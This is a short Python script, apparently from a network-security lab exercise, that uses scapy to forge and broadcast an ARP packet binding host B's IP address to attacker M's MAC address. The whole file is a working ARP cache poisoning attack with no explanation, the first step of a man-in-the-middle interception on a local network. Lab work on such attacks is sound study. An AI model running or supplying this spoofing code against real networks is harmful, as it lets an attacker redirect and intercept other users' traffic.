#!/usr/bin/env python3
from scapy.all import *

A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

E = Ether(src=M_mac,dst='ff:ff:ff:ff:ff:ff')
A = ARP(hwsrc=M_mac, psrc=B_ip, 
	hwdst='ff:ff:ff:ff:ff:ff', pdst=B_ip,
	op=1)
	
pkt = E/A
sendp(pkt)

